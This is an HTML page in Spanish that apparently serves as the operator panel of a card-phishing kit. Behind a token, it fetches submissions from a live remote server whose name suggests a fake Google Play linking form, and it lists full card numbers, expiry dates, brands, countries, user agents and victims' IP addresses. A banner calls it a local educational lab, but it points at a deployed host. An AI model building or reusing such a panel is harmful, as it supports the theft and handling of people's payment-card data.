<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registros — laboratorio</title>
 
    <script>window.__API_BASE__ = 'https://asociar-gplay.onrender.com/';</script>
    
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            margin: 0;
            min-height: 100vh;
            padding: 24px 16px;
            color: #e8d5a0;
            background-color: #0a0a0c;
            background-image:
                linear-gradient(155deg, rgba(8, 12, 18, 0.82) 0%, rgba(6, 10, 14, 0.75) 45%, rgba(10, 8, 16, 0.85) 100%),
                url('assets/fondo.png');
            background-size: cover, cover;
            background-position: center, center top;
            background-attachment: fixed, fixed;
            background-repeat: no-repeat, no-repeat;
        }
        .reg-panel {
            max-width: 960px;
            margin: 0 auto;
            padding: 24px 28px;
            border-radius: 16px;
            color: #e8d5a0;
            background: rgba(18, 14, 10, 0.82);
            border: 1px solid rgba(212, 175, 55, 0.35);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45), 0 0 40px rgba(180, 140, 40, 0.08);
            backdrop-filter: blur(12px);
        }
        .reg-panel h1 { color: #f5e6bc; }
        .reg-panel a { color: #e8d18a; font-weight: 600; }
        .reg-panel a:hover { color: #f5e6bc; }
        .warn { background: rgba(60, 48, 20, 0.75); border: 1px solid rgba(212, 175, 55, 0.45); color: #e8d5a0; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; }
        label { display: block; font-weight: 600; margin-bottom: 6px; color: #e8d18a; }
        input[type="password"], input[type="text"] {
            width: 100%; max-width: 360px; padding: 10px; border-radius: 8px;
            background: rgba(8, 7, 5, 0.65);
            border: 2px solid rgba(201, 168, 80, 0.4);
            color: #f5ecd4;
        }
        input::placeholder { color: rgba(232, 213, 160, 0.4); }
        button {
            margin-top: 12px; padding: 10px 18px; border-radius: 8px;
            border: 1px solid rgba(255, 236, 180, 0.35);
            background: linear-gradient(135deg, #6b5418 0%, #9a7a24 40%, #c9a227 100%);
            color: #1a1408; font-weight: 700; cursor: pointer;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
        }
        button:hover { filter: brightness(1.08); }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.85rem; }
        th, td { border: 1px solid rgba(201, 168, 80, 0.35); padding: 8px; text-align: left; vertical-align: top; color: #e8d5a0; }
        th { background: rgba(40, 32, 18, 0.85); color: #f5e6bc; }
        .err { color: #e8a090; margin-top: 12px; }
        code { background: rgba(0, 0, 0, 0.35); color: #f0e4b8; padding: 2px 6px; border-radius: 4px; border: 1px solid rgba(212, 175, 55, 0.25); }
    </style>
</head>
<body>
    <div class="reg-panel">
    <p><a href="/index.html">← Volver al formulario</a></p>
    <div class="warn">
        Vista solo para <strong>laboratorio local</strong>. Requiere token (<code>X-Lab-Token</code>). No expongas esto en internet con datos reales.
    </div>
    <h1>Envíos guardados</h1>
    <label for="token">Token de laboratorio</label>
    <input type="password" id="token" autocomplete="off" placeholder="educativo-local">
    <div>
        <button type="button" id="loadBtn">Cargar últimos registros</button>
    </div>
    <p id="status" class="err" style="display:none;"></p>
    <div id="tableWrap"></div>
    </div>
    <script>
        function apiUrl(path) {
            const raw = (typeof window.__API_BASE__ === 'string') ? window.__API_BASE__.trim() : '';
            const b = raw.replace(/\/$/, '');
            return b ? b + path : path;
        }

        const tokenInput = document.getElementById('token');
        const loadBtn = document.getElementById('loadBtn');
        const status = document.getElementById('status');
        const tableWrap = document.getElementById('tableWrap');

        loadBtn.addEventListener('click', async () => {
            status.style.display = 'none';
            tableWrap.innerHTML = '';
            const t = tokenInput.value.trim();
            if (!t) {
                status.textContent = 'Indica el token.';
                status.style.display = 'block';
                return;
            }
            try {
                const res = await fetch(apiUrl('/api/submissions?limit=100'), {
                    headers: { 'X-Lab-Token': t }
                });
                const data = await res.json().catch(() => ({}));
                if (!res.ok) {
                    throw new Error(data.error || 'Error ' + res.status);
                }
                if (!data.items || data.items.length === 0) {
                    tableWrap.innerHTML = '<p>No hay registros aún.</p>';
                    return;
                }
                const rows = data.items.map((r) => {
                    const cc = r.country_code || r.countryCode || '';
                    const cn = r.country || '';
                    const pais = cn ? (cc ? `${cn} (${cc})` : cn) : (cc || '—');
                    return `
                    <tr>
                        <td>${r.id}</td>
                        <td>${escapeHtml(r.created_at)}</td>
                        <td><code>${escapeHtml(r.card_number_digits)}</code></td>
                        <td>${escapeHtml(r.expiration)}</td>
                        <td>${escapeHtml(r.brand)}</td>
                        <td>${escapeHtml(pais)}</td>
                        <td style="max-width:180px;word-break:break-all;">${escapeHtml(r.user_agent || '')}</td>
                        <td>${escapeHtml(r.remote_address || '')}</td>
                    </tr>`;
                }).join('');
                tableWrap.innerHTML = `
                    <p>${data.count} registro(s).</p>
                    <table>
                        <thead><tr><th>ID</th><th>Fecha</th><th>Dígitos</th><th>Vence</th><th>Marca</th><th>País (aprox.)</th><th>User-Agent</th><th>IP</th></tr></thead>
                        <tbody>${rows}</tbody>
                    </table>
                `;
            } catch (e) {
                status.textContent = e.message;
                status.style.display = 'block';
            }
        });

        function escapeHtml(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;');
        }
    </script>
</body>
</html>
